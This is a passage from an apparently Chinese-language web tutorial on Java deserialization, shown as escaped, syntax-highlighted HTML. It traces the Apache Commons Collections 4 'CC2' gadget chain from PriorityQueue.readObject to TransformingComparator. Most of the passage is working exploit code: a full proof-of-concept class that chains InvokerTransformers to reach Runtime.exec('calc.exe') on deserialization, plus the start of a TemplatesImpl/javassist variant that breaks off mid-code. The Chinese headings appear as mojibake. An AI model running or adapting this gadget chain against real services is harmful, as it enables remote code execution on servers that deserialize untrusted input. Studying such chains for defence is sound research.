&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">defaultReadObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in (and discard) array length
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SharedSecrets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getJavaOISAccess&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">checkArray&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in all elements.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Elements are guaranteed to be in &amp;#34;proper order&amp;#34;, but the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// spec has never explained what that might be.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">heapify&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>heapify-&amp;gt; siftDown-&amp;gt; siftDownUsingComparator-&amp;gt; comparator.compare-&amp;gt; TransformingComparator-&amp;gt; compare-&amp;gt; transform
&lt;/code>&lt;/pre>&lt;p>æ„é€ poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Comparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.comparators.TransformingComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CC2&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Comparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PriorityQueue&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="templatesimpl">TemplatesImpl&lt;/h3>
&lt;p>æŠŠexpæ”¹é€ ä¸ºTemplatesImplçš„æ— transformeræ•°ç»„ç‰ˆ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.comparators.TransformingComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Comparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections2TemplatesImpl&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getBytescode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
